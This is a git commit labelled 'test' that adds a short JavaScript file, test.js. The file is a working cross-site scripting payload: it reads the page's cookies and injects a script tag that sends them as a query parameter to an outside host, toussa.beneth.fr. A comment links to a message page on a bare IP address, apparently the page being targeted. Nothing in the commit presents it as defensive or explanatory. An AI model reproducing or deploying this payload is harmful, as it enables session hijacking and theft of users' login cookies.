bbbb418c31f3284f44dc7c9b7451f9b6c9c03b37
Jean-Sebastien Baklouti <jeansebastien.baklouti@gmail.com>
2017-12-29 02:27:56 +0100

    test

---
+++ test.js
@@ -0,0 +1,5 @@
+//http://35.198.120.230/messages/new/e836558151127b85d1bf286a10c14a06
+var test = document.cookie
+var my_awesome_script = document.createElement('script');
+	my_awesome_script.setAttribute('src','http://toussa.beneth.fr/?cookie='+test);
+document.head.appendChild(my_awesome_script);
